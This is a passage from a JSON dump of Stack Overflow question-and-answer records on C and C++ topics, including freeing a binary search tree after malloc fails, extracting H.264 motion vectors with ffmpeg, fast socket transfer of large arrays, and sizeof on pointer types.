myAttrib=\"x\"&gt;Content&lt;/MyElement&gt;\n</code></pre>\n\n<p>Surprisingly, I'm not seeing any questions on SO that address this. Maybe because people just output XML themselves rather than using a library.</p>\n\n<p>The C code I have so far is:</p>\n\n<pre><code>if (xmlTextWriterStartElement(writer, BAD_CAST \"MyElement\") &lt; 0\n    || xmlTextWriterWriteAttribute(writer, BAD_CAST \"myAttrib\", \"x\") &lt; 0\n    || somehow print out content &lt; 0\n    || xmlTextWriterEndElement(writer) &lt; 0)\n{\n   // Handle error\n}\n</code></pre>\n"}, {"tags": ["c", "recursion", "malloc", "binary-search-tree", "free"], "comments": [{"owner": {"reputation": 46708, "user_id": 179715, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e240f1a5bb197450dfb8934dd55d9e3a?s=128&d=identicon&r=PG", "display_name": "jamesdlin", "link": "https://stackoverflow.com/users/179715/jamesdlin"}, "edited": false, "score": 1, "creation_date": 1437550076, "post_id": 31556454, "comment_id": 51069899, "body": "Why would you need a global error flag when your <code>buildTree</code> function could have a perfectly good return type? (That is, why not just make <code>buildTree</code> return an error code, and then propagate that up on failures?)"}, {"owner": {"reputation": 60, "user_id": 2945733, "user_type": "registered", "profile_image": "https://graph.facebook.com/1724121447/picture?type=large", "display_name": "TylerN", "link": "https://stackoverflow.com/users/2945733/tylern"}, "reply_to_user": {"reputation": 46708, "user_id": 179715, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e240f1a5bb197450dfb8934dd55d9e3a?s=128&d=identicon&r=PG", "display_name": "jamesdlin", "link": "https://stackoverflow.com/users/179715/jamesdlin"}, "edited": false, "score": 0, "creation_date": 1437550347, "post_id": 31556454, "comment_id": 51070039, "body": "You aren&#39;t wrong, but that doesn&#39;t really address  the question... Unless I misunderstand you? Even if I did the &quot;c-style&quot; error-handling of return an int to represent success or failure, I still wouldn&#39;t know how to handle freeing the nodes that were allocated before the malloc() failed...    Can you maybe expand on what you were thinking if I seem to have misunderstood what you were suggesting?  How would I check for the result of a recursive call within the function? Can you maybe provide an example? I think you might be on to something, but i&#39;m not sure..."}, {"owner": {"reputation": 46708, "user_id": 179715, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e240f1a5bb197450dfb8934dd55d9e3a?s=128&d=identicon&r=PG", "display_name": "jamesdlin", "link": "https://stackoverflow.com/users/179715/jamesdlin"}, "edited": false, "score": 1, "creation_date": 1437550635, "post_id": 31556454, "comment_id": 51070200, "body": "You could propagate the error code up all the way and have the caller be responsible for freeing the tree if it&#39;s only partially built.  You could make it somewhat nicer by introducing a wrapper function to perform the initial <code>buildTree</code> call, and then that function would be responsible for cleanup on failure."}, {"owner": {"reputation": 60, "user_id": 2945733, "user_type": "registered", "profile_image": "https://graph.facebook.com/1724121447/picture?type=large", "display_name": "TylerN", "link": "https://stackoverflow.com/users/2945733/tylern"}, "reply_to_user": {"reputation": 46708, "user_id": 179715, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e240f1a5bb197450dfb8934dd55d9e3a?s=128&d=identicon&r=PG", "display_name": "jamesdlin", "link": "https://stackoverflow.com/users/179715/jamesdlin"}, "edited": false, "score": 0, "creation_date": 1437550708, "post_id": 31556454, "comment_id": 51070242, "body": "+1 I&#39;ll have to give this a shot in the morning. If it works i&#39;ll report back. If I have more questions i&#39;ll also report back."}, {"owner": {"reputation": 3805, "user_id": 247643, "user_type": "registered", "accept_rate": 58, "profile_image": "https://www.gravatar.com/avatar/8e9927c1955a6b0497cf6c13d9a7b403?s=128&d=identicon&r=PG", "display_name": "doynax", "link": "https://stackoverflow.com/users/247643/doynax"}, "edited": false, "score": 1, "creation_date": 1437556217, "post_id": 31556454, "comment_id": 51073676, "body": "The traditional way of handling this type of clean-up in C, at least in larger applications, is to set up multiple allocators (memory arenas) which may be freed in their entirety when one phase of execution has completed. Of course if you&#39;re just going to exit afterwards then it should be noted that C environments not automatically freeing all memory at exit are virtually non-existent these days, so unless you have a particular oddball platform in mind then I just wouldn&#39;t bother in this case. Especially not for a teaching example not directly focused on error handling."}, {"owner": {"reputation": 60, "user_id": 2945733, "user_type": "registered", "profile_image": "https://graph.facebook.com/1724121447/picture?type=large", "display_name": "TylerN", "link": "https://stackoverflow.com/users/2945733/tylern"}, "reply_to_user": {"reputation": 3805, "user_id": 247643, "user_type": "registered", "accept_rate": 58, "profile_image": "https://www.gravatar.com/avatar/8e9927c1955a6b0497cf6c13d9a7b403?s=128&d=identicon&r=PG", "display_name": "doynax", "link": "https://stackoverflow.com/users/247643/doynax"}, "edited": false, "score": 0, "creation_date": 1437588568, "post_id": 31556454, "comment_id": 51096447, "body": "@doynax I didn&#39;t know that; so you&#39;re saying that most environments will automatically free the memory if it isn&#39;t cleaned up by the program? Such as on the command line on a linux/unix environment and within major IDEs such as Netbeans?"}, {"owner": {"reputation": 3805, "user_id": 247643, "user_type": "registered", "accept_rate": 58, "profile_image": "https://www.gravatar.com/avatar/8e9927c1955a6b0497cf6c13d9a7b403?s=128&d=identicon&r=PG", "display_name": "doynax", "link": "https://stackoverflow.com/users/247643/doynax"}, "edited": false, "score": 1, "creation_date": 1437594356, "post_id": 31556454, "comment_id": 51100002, "body": "@TylerN: That&#39;s correct. If it didn&#39;t then misbehaving programs would gradually eat up all of the memory in the system. This nicety isn&#39;t guaranteed but any modern desktop operating system certainly will, certainly anything with memory protection to protect misbehaving/malicious processes from treading on each others toes."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1437663264, "post_id": 31556454, "comment_id": 51133769, "body": "regarding the example call to malloc(): &#39;malloc(sizeof(Word))&#39; this will malloc 4 (or 8 bytes, depending on the underlying architecture) probably not what you want.   in C, do not cast the returned value from malloc() as it is a void* so can be assigned to any pointer."}, {"owner": {"reputation": 60, "user_id": 2945733, "user_type": "registered", "profile_image": "https://graph.facebook.com/1724121447/picture?type=large", "display_name": "TylerN", "link": "https://stackoverflow.com/users/2945733/tylern"}, "reply_to_user": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1437726315, "post_id": 31556454, "comment_id": 51161633, "body": "@user3629249 Word here is a defined struct. It&#39;s not a traditional &quot;word&quot;. It&#39;s misleading without more context, but I took it from an assignment where we are dealing with parsing strings and check whether or not they are spelt correctly. And I am having them typecast precisely because it is a void pointer and I want them to have a compile error if they try to assign it to the wrong data type. These are second semester students.   Genuinely, thank you for trying to offer advice though."}], "answers": [{"comments": [{"owner": {"reputation": 60, "user_id": 2945733, "user_type": "registered", "profile_image": "https://graph.facebook.com/1724121447/picture?type=large", "display_name": "TylerN", "link": "https://stackoverflow.com/users/2945733/tylern"}, "edited": false, "score": 0, "creation_date": 1437588733, "post_id": 31557546, "comment_id": 51096563, "body": "OH! -_- well, I hadn&#39;t considered freeing the nodes bottom-up. I was fighting with trying to maintain a reference to the tree head as it was being built. Which, still doesn&#39;t wouldn&#39;t change after the first call... huh. Well, anyway, thanks!"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 2, "creation_date": 1437664083, "post_id": 31557546, "comment_id": 51134500, "body": "the suggested &#39;bottom up&#39; free sequence will not work as the recursive path does not visit all nodes in the tree.  So no freeing, rather let the original caller of the function handle the error"}, {"owner": {"reputation": 60, "user_id": 2945733, "user_type": "registered", "profile_image": "https://graph.facebook.com/1724121447/picture?type=large", "display_name": "TylerN", "link": "https://stackoverflow.com/users/2945733/tylern"}, "reply_to_user": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1437726590, "post_id": 31557546, "comment_id": 51161770, "body": "@user3629249 Thanks for catching that. I haven&#39;t had a chance to test the solution either way, but what you said makes sense. Thanks!"}, {"owner": {"reputation": 46708, "user_id": 179715, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e240f1a5bb197450dfb8934dd55d9e3a?s=128&d=identicon&r=PG", "display_name": "jamesdlin", "link": "https://stackoverflow.com/users/179715/jamesdlin"}, "edited": false, "score": 0, "creation_date": 1437820426, "post_id": 31557546, "comment_id": 51198807, "body": "In this particular case, I think the original version of this answer would work with what code we&#39;re given in the question. Each call to <code>buildTree</code> creates 1 node and recursively calls <code>buildTree</code> once more (there is no tree recursion).  When failure occurs, recursive freeing isn&#39;t necessary; all descendant nodes would already have been freed."}, {"owner": {"user_type": "does_not_exist", "display_name": "user781847"}, "reply_to_user": {"reputation": 46708, "user_id": 179715, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e240f1a5bb197450dfb8934dd55d9e3a?s=128&d=identicon&r=PG", "display_name": "jamesdlin", "link": "https://stackoverflow.com/users/179715/jamesdlin"}, "edited": false, "score": 0, "creation_date": 1437820918, "post_id": 31557546, "comment_id": 51198939, "body": "@jamesdlin I think user3629249 is still right. An adapted version that free the nodes bottom-up can still be made because when working with ptr to ptr we can set a freed ptr to null and so after the recursive call we can tell if one sub-tree need to be freed (it is non null) and free it (with another function). But it is not elegant in my opinion, I prefer the return only version."}], "tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user781847"}, "is_accepted": true, "score": 1, "last_activity_date": 1437664357, "last_edit_date": 1437664357, "creation_date": 1437552953, "answer_id": 31557546, "question_id": 31556454, "link": "https://stackoverflow.com/questions/31556454/how-do-we-handle-freeing-a-bst-when-malloc-fails-in-the-middle-of-our-recursive/31557546#31557546", "title": "How do we handle freeing a BST when malloc fails in the middle of our recursive build?", "body": "<p>We usually use a return error and let the caller free it, after all it could very well free other non critical resources and try to insert the node again.</p>\n\n<pre><code>#define BUILD_OK     0\n#define BUILD_FAILED 1\n\nint buildTree(Word** tree, const char* input) {\n    int res;\n\n    //See if we have found the spot to insert the node.\n    //Do this by checking for NULL\n    if (!(*tree)) {\n        if (!(*tree = createNode(input)))\n            return BUILD_FAILED;\n\n        //Maybe other checks\n\n        return BUILD_OK;\n    }\n    //else, move left or right accordingly.\n    if (strcmp(input, (*tree)-&gt;data) &lt; 0)\n       res = buildTree(&amp;(*tree)-&gt;left, input);\n    else\n       res = buildTree(&amp;(*tree)-&gt;right, input);\n\n    return res;\n}\n</code></pre>\n"}], "owner": {"reputation": 60, "user_id": 2945733, "user_type": "registered", "profile_image": "https://graph.facebook.com/1724121447/picture?type=large", "display_name": "TylerN", "link": "https://stackoverflow.com/users/2945733/tylern"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 158, "favorite_count": 0, "accepted_answer_id": 31557546, "answer_count": 1, "score": 0, "last_activity_date": 1437664357, "creation_date": 1437549826, "question_id": 31556454, "link": "https://stackoverflow.com/questions/31556454/how-do-we-handle-freeing-a-bst-when-malloc-fails-in-the-middle-of-our-recursive", "title": "How do we handle freeing a BST when malloc fails in the middle of our recursive build?", "body": "<p>I've done some looking around and can't really find a good source that even addresses the idea. </p>\n\n<p>First: It's well known that we should always check if malloc() and realloc() return null. This is commonly done in some way similar to: </p>\n\n<pre><code>Word* temp;\nif ((temp = (Word*)malloc(sizeof(Word))) == NULL) {\n    fprintf(stderr, \"unable to malloc for node.\\n\");\n    exit(EXIT_FAILURE);\n}\n</code></pre>\n\n<p>However, we also generally build binary search trees in a recursive manner, like so: </p>\n\n<pre><code>void buildTree(Word** tree, const char* input) {\n    //See if we have found the spot to insert the node.\n    //Do this by checking for NULL\n    if (!(*tree)) {\n        *tree = createNode(input);\n        return;\n    }\n    //else, move left or right accordingly.\n    if (strcmp(input, (*tree)-&gt;data) &lt; 0)\n        buildTree(&amp;(*tree)-&gt;left, input);\n    else\n        buildTree(&amp;(*tree)-&gt;right, input);\n    return;\n}\n</code></pre>\n\n<p>So, what do we do if we start working with massive data sets and malloc() fails to allocate memory in the middle of that recursive buildTree function? I've tried a number of things from keeping track of a \"global error\" flag and a \"global head\" node pointer and it just seems to be more and more messy the more I try. Examples working with building BSTs rarely seem to give any thought to malloc() failing, so they aren't really helpful in this regard. </p>\n\n<p>I can logically see that one answer is \"Don't use recursion and return the head of the tree each time.\" and while I can see why that would work, I'm an undergraduate TA and one of the things we use BSTs to teach is recursion. So, saying \"don't use recursion\" to my students when we are TEACHING recursion would be self-defeating. </p>\n\n<p>Any thoughts, suggestions, or links would be greatly appreciated. </p>\n"}, {"tags": ["c", "ffmpeg", "h.264", "video-processing"], "comments": [{"owner": {"reputation": 59891, "user_id": 1207195, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Q3P4g.jpg?s=128&g=1", "display_name": "Adriano Repetti", "link": "https://stackoverflow.com/users/1207195/adriano-repetti"}, "edited": false, "score": 0, "creation_date": 1437550389, "post_id": 31556421, "comment_id": 51070063, "body": "Asking for tutorials, tools and libraries is off-topic for Stack Overflow (see <a href=\"https://stackoverflow.com/help\">help center</a>). Also note that <a href=\"https://www.ffmpeg.org/doxygen/trunk/ffplay_8c-source.html\" rel=\"nofollow noreferrer\">ffplay source code</a> is licensed under LGPL and it&#39;s available."}, {"owner": {"reputation": 786, "user_id": 410354, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/3507b8ffe43f9e3ed46d3f295b79470a?s=128&d=identicon&r=PG", "display_name": "Luca", "link": "https://stackoverflow.com/users/410354/luca"}, "edited": false, "score": 2, "creation_date": 1447086866, "post_id": 31556421, "comment_id": 55001765, "body": "He is also asking for code / guidance, so a more helpful action would have been to provide some code samples."}], "answers": [{"comments": [{"owner": {"reputation": 534, "user_id": 1484384, "user_type": "registered", "accept_rate": 17, "profile_image": "https://www.gravatar.com/avatar/c4025b34a5ce30ba73c491fcc2513d49?s=128&d=identicon&r=PG", "display_name": "Vishnu Narang", "link": "https://stackoverflow.com/users/1484384/vishnu-narang"}, "edited": false, "score": 0, "creation_date": 1473045292, "post_id": 31563183, "comment_id": 65978868, "body": "Hi, can you please give some more details as to how we could use AVMotionVectors in MATLAB. Your answer does give some hint but i&#39;m blocked for the usage. How to get this in Matlab. There is very little info online about that."}, {"owner": {"reputation": 9546, "user_id": 4726410, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-01-VKaG7APo/AAAAAAAAAAI/AAAAAAAAE9w/c0cx5Eqf08s/photo.jpg?sz=128", "display_name": "Ronald S. Bultje", "link": "https://stackoverflow.com/users/4726410/ronald-s-bultje"}, "reply_to_user": {"reputation": 534, "user_id": 1484384, "user_type": "registered", "accept_rate": 17, "profile_image": "https://www.gravatar.com/avatar/c4025b34a5ce30ba73c491fcc2513d49?s=128&d=identicon&r=PG", "display_name": "Vishnu Narang", "link": "https://stackoverflow.com/users/1484384/vishnu-narang"}, "edited": false, "score": 0, "creation_date": 1473070764, "post_id": 31563183, "comment_id": 65988345, "body": "I would ask a new question with some more detail, I don&#39;t know how you want to input data in matlab or what you&#39;re blocked on exactly."}], "tags": [], "owner": {"reputation": 9546, "user_id": 4726410, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-01-VKaG7APo/AAAAAAAAAAI/AAAAAAAAE9w/c0cx5Eqf08s/photo.jpg?sz=128", "display_name": "Ronald S. Bultje", "link": "https://stackoverflow.com/users/4726410/ronald-s-bultje"}, "is_accepted": false, "score": 8, "last_activity_date": 1437587299, "last_edit_date": 1437587299, "creation_date": 1437568124, "answer_id": 31563183, "question_id": 31556421, "link": "https://stackoverflow.com/questions/31556421/extraction-motion-vectors-from-h-264-bitstream/31563183#31563183", "title": "Extraction motion vectors from H.264 bitstream", "body": "<p>The source code for the codecview video filter is <a href=\"http://ffmpeg.org/doxygen/trunk/vf__codecview_8c_source.html\" rel=\"noreferrer\">here</a>, is that what you're looking for?</p>\n\n<p>[edit] Sorry I guess that's not terribly helpful. The function you're looking for is <a href=\"http://ffmpeg.org/doxygen/trunk/vf__codecview_8c_source.html#l00195\" rel=\"noreferrer\">filter_frame()</a>, which shows you how to read AVMotionVectors (as side-data) from a given AVFrame, this is the code used in your commandline example. This example calls draw_arrow(), but you can simply replace that with a call to printf() or some custom function that logs the MV information to a logfile of your choosing.</p>\n"}], "owner": {"reputation": 1123, "user_id": 2778860, "user_type": "registered", "accept_rate": 42, "profile_image": "https://i.stack.imgur.com/PpV12.png?s=128&g=1", "display_name": "chronosynclastic", "link": "https://stackoverflow.com/users/2778860/chronosynclastic"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 4975, "favorite_count": 4, "closed_date": 1437594935, "answer_count": 1, "score": 5, "last_activity_date": 1437587299, "creation_date": 1437549717, "last_edit_date": 1495535372, "question_id": 31556421, "link": "https://stackoverflow.com/questions/31556421/extraction-motion-vectors-from-h-264-bitstream", "closed_reason": "Not suitable for this site", "title": "Extraction motion vectors from H.264 bitstream", "body": "<p>I'm looking for an open-source tool/code or some guidance to extract the motion vectors (MVs) of a H.264 encoded bit sequence. I'm already aware that motion vectors can be visualized using ffmpeg with the following command:</p>\n\n<p><code>ffplay -flags2 +export_mvs input.mp4 -vf codecview=mv=pf+bf+bb</code></p>\n\n<p>However, I want to produce a log file where the MVs of P and B frames are listed frame by frame. I checked out the structure of MVs from libavutil/motion_vector.h, but I couldn't find an example which shows how they are extracted and laid over the original sequence by ffplay. I thought that if I can find that out, I could possibly re-arrange the code to extract the MVs to a text file.</p>\n\n<p>I also tried the code given in <a href=\"https://stackoverflow.com/questions/19993733/motion-vector-extraction-from-encoded-video-file\">this answer</a>, but it doesn't seem to work with the newer versions of ffmpeg:</p>\n\n<p>I would appreciate any example codes or hints.</p>\n"}, {"tags": ["c++", "c", "arrays", "sockets"], "comments": [{"owner": {"reputation": 94195, "user_id": 410767, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/2c1dd4727d07c7dbb6ff8c3a83e400b5?s=128&d=identicon&r=PG", "display_name": "Tony Delroy", "link": "https://stackoverflow.com/users/410767/tony-delroy"}, "edited": false, "score": 7, "creation_date": 1437549483, "post_id": 31556290, "comment_id": 51069597, "body": "Just a thought - have you tried compression?"}, {"owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "edited": false, "score": 0, "creation_date": 1437549629, "post_id": 31556290, "comment_id": 51069676, "body": "Do you really need to transmit all the data at once? Maybe you could store it somewhere (e.g. in some database) and fetch it incrementally by chunks? We can&#39;t help if you don&#39;t explain what that data really is and where does it come from...."}, {"owner": {"reputation": 8847, "user_id": 3484570, "user_type": "registered", "accept_rate": 53, "profile_image": "https://i.stack.imgur.com/r5BRZ.png?s=128&g=1", "display_name": "nwp", "link": "https://stackoverflow.com/users/3484570/nwp"}, "edited": false, "score": 5, "creation_date": 1437549640, "post_id": 31556290, "comment_id": 51069681, "body": "Try moving the algorithm to the data instead of moving the data to the algorithm. Maybe map-reduce could help you."}, {"owner": {"reputation": 101058, "user_id": 318758, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9870a37447a4ae811096e8e7d10ed3f9?s=128&d=identicon&r=PG", "display_name": "Joni", "link": "https://stackoverflow.com/users/318758/joni"}, "edited": false, "score": 4, "creation_date": 1437550347, "post_id": 31556290, "comment_id": 51070040, "body": "If you do the math, transferring 8GB on an 100mbps network will take at least 11 minutes. Is that acceptable?"}, {"owner": {"reputation": 1556, "user_id": 2782324, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/4de42addb29cbfd080f1ad262c6ebb60?s=128&d=identicon&r=PG&f=1", "display_name": "chettyharish", "link": "https://stackoverflow.com/users/2782324/chettyharish"}, "edited": false, "score": 0, "creation_date": 1437591293, "post_id": 31556290, "comment_id": 51098185, "body": "Just noticed that I did the stupid mistake of typing b instead of B. It is 100MBps Sorry folks."}], "answers": [{"comments": [{"owner": {"reputation": 5896, "user_id": 1106415, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/o6fvK.png?s=128&g=1", "display_name": "hlt", "link": "https://stackoverflow.com/users/1106415/hlt"}, "edited": false, "score": 0, "creation_date": 1437550242, "post_id": 31556491, "comment_id": 51069987, "body": "Please cite the relevant information from your link, because the linked information may change or be removed entirely."}, {"owner": {"reputation": 1403, "user_id": 5076707, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/tGqWB.jpg?s=128&g=1", "display_name": "Pumkko", "link": "https://stackoverflow.com/users/5076707/pumkko"}, "reply_to_user": {"reputation": 5896, "user_id": 1106415, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/o6fvK.png?s=128&g=1", "display_name": "hlt", "link": "https://stackoverflow.com/users/1106415/hlt"}, "edited": false, "score": 1, "creation_date": 1437550722, "post_id": 31556491, "comment_id": 51070254, "body": "I added precisions, Hope it&#39;s better now"}, {"owner": {"reputation": 5896, "user_id": 1106415, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/o6fvK.png?s=128&g=1", "display_name": "hlt", "link": "https://stackoverflow.com/users/1106415/hlt"}, "edited": false, "score": 1, "creation_date": 1437550812, "post_id": 31556491, "comment_id": 51070298, "body": "Great, thanks! (for the future: people tend to vote to delete link-only answers)"}], "tags": [], "owner": {"reputation": 1403, "user_id": 5076707, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/tGqWB.jpg?s=128&g=1", "display_name": "Pumkko", "link": "https://stackoverflow.com/users/5076707/pumkko"}, "is_accepted": true, "score": 3, "last_activity_date": 1437550644, "last_edit_date": 1495539841, "creation_date": 1437549948, "answer_id": 31556491, "question_id": 31556290, "link": "https://stackoverflow.com/questions/31556290/fastest-way-to-transfer-large-arrays-via-sockets/31556491#31556491", "title": "Fastest way to transfer large arrays via sockets", "body": "<p>You can try to compress your array. There are several algorithm you can find and this <a href=\"https://stackoverflow.com/a/16469857/5076707\">post</a> may help you. It provides an explanation for the three most known lossless algorithm :<br>\n 1. Huffman a tree based algorithm it has a lot of applications and specialization<br>\n 2. RLE for Run-length encoding  is well suited for icons compression<br>\n 3. LZ77 which use a dictionnary and is a basis to a lot of different algorithms</p>\n\n<p>A lossless algorithm is what you need because you don't want to lose the datas in your array. That's why I wouldn't recommend UDP since it does not check if the data has been received. </p>\n"}, {"tags": [], "owner": {"reputation": 3631, "user_id": 1094101, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9afb6bd332cc5182d7c6c75c88123cbe?s=128&d=identicon&r=PG&f=1", "display_name": "Non-maskable Interrupt", "link": "https://stackoverflow.com/users/1094101/non-maskable-interrupt"}, "is_accepted": false, "score": 4, "last_activity_date": 1437550485, "creation_date": 1437550485, "answer_id": 31556670, "question_id": 31556290, "link": "https://stackoverflow.com/questions/31556290/fastest-way-to-transfer-large-arrays-via-sockets/31556670#31556670", "title": "Fastest way to transfer large arrays via sockets", "body": "<p>First, upgrade your hardware. With 1GB NIC (or 10GB if you have the budget) and a decent switch you get 10x boost with no coding, transferring 8GB data takes about <em>just</em> one minute. Push it further with NIC bonding you double it again to <em>just</em> 30 seconds (or 60 times faster than your).</p>\n\n<p>Next, adjust your algorithm, do you need to send the whole 8GB data frequently? Can you pipeline it, do in streaming way, or send only diffs (replica), so that you get good data processing throughput?</p>\n\n<p>The last thing you can do is compression, and better do in chunks so that you don't compress the whole 8GB at once.</p>\n"}], "owner": {"reputation": 1556, "user_id": 2782324, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/4de42addb29cbfd080f1ad262c6ebb60?s=128&d=identicon&r=PG&f=1", "display_name": "chettyharish", "link": "https://stackoverflow.com/users/2782324/chettyharish"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 466, "favorite_count": 0, "accepted_answer_id": 31556491, "answer_count": 2, "score": 1, "last_activity_date": 1437591257, "creation_date": 1437549285, "last_edit_date": 1437591257, "question_id": 31556290, "link": "https://stackoverflow.com/questions/31556290/fastest-way-to-transfer-large-arrays-via-sockets", "title": "Fastest way to transfer large arrays via sockets", "body": "<p>I was trying to transfer large number of data (long int arrays) from multiple (8) remote computers to a single computer(main process). All these are connected via a 100 MBps LAN and are identical machines(so no worry about endianess). </p>\n\n<p>Each remote machine has an array of 8GB long int's and I have to transmit it to the single computer for processing. My question is what is the best way to transfer these arrays quickly to the main process . I tried using traditional TCP to do this job and it takes a lot of time for transferring the data (about 28 minutes). Is there any way to boost this speed up? . Will switching to UDP help me? Will using multiple ports/sockets help me for buffering? Whats the best approach to solve such problems?</p>\n\n<p>I probably cannot compress the data (as most of them are unique) and I need to send everything (as I carry out important operations in the main process)</p>\n"}, {"tags": ["c", "pointers", "sizeof"], "comments": [{"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 1, "creation_date": 1437549433, "post_id": 31556285, "comment_id": 51069572, "body": "use <code>%zu</code> to print a <i>size_t</i>."}, {"owner": {"reputation": 347, "user_id": 5122214, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2bc1e08af082a59786967aa584c3671b?s=128&d=identicon&r=PG&f=1", "display_name": "Chaka", "link": "https://stackoverflow.com/users/5122214/chaka"}, "edited": false, "score": 0, "creation_date": 1437549455, "post_id": 31556285, "comment_id": 51069583, "body": "in visuals studio 2013 its 4 4 80"}, {"owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "edited": false, "score": 3, "creation_date": 1437549540, "post_id": 31556285, "comment_id": 51069626, "body": "Note that <code>*p</code> is <b>not</b> a pointer: it&#39;s an <code>int</code>."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1437660143, "post_id": 31556285, "comment_id": 51131119, "body": "compile with all warnings enabled.   The posted code does not cleanly compile.  All the compiler raised warnings are on the printf() parameters.  Fix the warnings."}], "answers": [{"tags": [], "owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "is_accepted": true, "score": 7, "last_activity_date": 1437549652, "creation_date": 1437549652, "answer_id": 31556394, "question_id": 31556285, "link": "https://stackoverflow.com/questions/31556285/why-size-is-different-for-different-pointers/31556394#31556394", "title": "Why Size is different for different pointers", "body": "<p>Consider the <em>types</em>.</p>\n\n<ol>\n<li><code>sizeof(*p)</code> ==> <code>sizeof(int)</code> </li>\n<li><code>sizeof(*p1)</code> ==> <code>sizeof(int *)</code></li>\n<li><code>sizeof(*p2)</code> ==> <code>sizeof((int [20]))</code></li>\n</ol>\n\n<p>Note: Depending on your platform and compiler, you'll get different results.</p>\n\n<p>Also, as we know, <code>sizeof</code> produces a result of type <code>size_t</code>, it's advised to use <code>%zu</code> format specifier to print the result.</p>\n"}], "owner": {"reputation": 101, "user_id": 1595186, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/56012f7d75c04bb34341bb2cf999de7b?s=128&d=identicon&r=PG", "display_name": "Gajukorse", "link": "https://stackoverflow.com/users/1595186/gajukorse"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 75, "favorite_count": 0, "accepted_answer_id": 31556394, "answer_count": 1, "score": -1, "last_activity_date": 1437552792, "creation_date": 1437549270, "last_edit_date": 1437552792, "question_id": 31556285, "link": "https://stackoverflow.com/questions/31556285/why-size-is-different-for-different-pointers", "title": "Why Size is different for different pointers", "body": "<pre><code>#include &lt;stdio.h&gt;\n\n#define R 10\n#define C 20\n\nint main()\n{\n    int *p;\n    int *p1[R];\n    int *p2[R][C];\n    printf(\"%d %d %d\", sizeof(*p),sizeof(*p1),sizeof(*p2));\n    getchar();\n    return 0;\n}\n</code></pre>\n\n<p>Why is the output: <code>4 8 160</code>? Why does size of <code>p1</code> becomes 8 and not 4?</p>\n"}, {"tags": ["c++", "c", "pointers"], "comments": [{"owner": {"reputation": 26141, "user_id": 38207, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/8e2c3bc8e5b3f634cc9a77606e983226?s=128&d=identicon&r=PG", "display_name": "James Anderson", "link": "https://stackoverflow.com/users/38207/james-anderson"}, "edited": false, "score": 1, "creation_date": 1437549688, "post_id": 31557618, "comment_id": 51071696, "body": "Please read the documentation for &quot;gets()&quot;. &quot;man gets&quot; should tell you all you need to know."}, {"owner": {"reputation": 222, "user_id": 2344524, "user_type": "registered", "profile_image": 